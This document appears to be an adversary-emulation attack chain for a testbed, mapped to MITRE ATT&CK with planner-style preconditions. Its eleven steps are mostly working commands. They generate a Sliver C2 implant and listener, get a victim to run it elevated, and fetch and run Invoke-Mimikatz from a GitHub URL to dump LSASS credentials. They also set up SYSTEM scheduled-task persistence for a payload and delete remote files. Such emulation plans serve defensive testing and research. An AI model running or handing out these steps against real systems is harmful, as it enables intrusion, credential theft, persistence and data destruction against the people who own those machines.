# Chain 019

**Testbed**: `env0` · **Steps**: 11 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Defense Evasion, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001, T1059.003 |
| Discovery | T1082 |
| Credential Access | T1003.001 |
| Persistence | T1053.005 |
| Defense Evasion | T1070.004, T1485 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1082 | Environment Variable Retrieval | Sliver Executor |
| 5 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 6 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 7 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 8 | Credential Access | T1003.001 | Powershell Mimikatz | Powershell Executor |
| 9 | Execution | T1059.003 | Execute Command (cmd.exe) | Sliver Session Derive |
| 10 | Persistence | T1053.005 | Scheduled Task Startup Script | Command Prompt Executor |
| 11 | Defense Evasion, Impact | T1070.004, T1485 | Remove Remote Path | Sliver Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Environment Variable Retrieval

- **UUID**: `sliver-get_env`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `get_env` command retrieves environment variable values.

**Execution** (Sliver Executor)

```
get_env(name=#{name}, session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `name` | Environment variable name to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 5 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 6 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 7 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 8 — Powershell Mimikatz

- **UUID**: `art-t1003_001-mimikatz-powershell`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
(PowerSploit variant). Requires elevated PowerShell context and outbound
HTTPS to the script host. See ART auto_generated_guid
66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.

**Execution** (Powershell Executor)

```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the command. | — | yes |
| `remote_script` | URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror). | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 9 — Execute Command (cmd.exe)

- **UUID**: `sliver-cmd`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: Command and Scripting Interpreter: Windows Command Shell


**Description**

The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 10 — Scheduled Task Startup Script

- **UUID**: `art-t1053_005-schtasks-onstart`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1053.005
- **Technique(s)**: Scheduled Task/Job: Scheduled Task

**Description**

Creates a scheduled task that fires at logon and a second task that
fires at system startup running as SYSTEM. Classic persistence via
Task Scheduler. Original ART test hardcodes calc.exe as the payload;
parameterised here so operators can substitute a real one. ART
auto_generated_guid fec27f65-db86-4c2d-b66c-61945aee87c2.

**Execution** (Command Prompt Executor)

```
schtasks /create /tn "#{task_name_logon}" /sc onlogon /tr "#{task_command}"
schtasks /create /tn "#{task_name_startup}" /sc onstart /ru system /tr "#{task_command}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke schtasks. | — | yes |
| `task_name_logon` | Name of the scheduled task firing at user logon. | T1053_005_OnLogon | yes |
| `task_name_startup` | Name of the scheduled task firing at system startup. | T1053_005_OnStartup | yes |
| `task_command` | Command line the scheduled tasks execute. | cmd.exe /c C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 11 — Remove Remote Path

- **UUID**: `sliver-rm`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: Indicator Removal: File Deletion
, Data Destruction

**Description**

The `rm(remote_path, recursive=False, force=False)` command removes a directory or file(s) from the remote system. Parameters include remote_path (remote path), recursive (recursively remove file(s)), and force (forcefully remove the file(s)).

**Execution** (Sliver Executor)

```
rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Recursive` | Recursively remove file(s) | — | yes |
| `Force` | Forcefully remove the file(s) | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
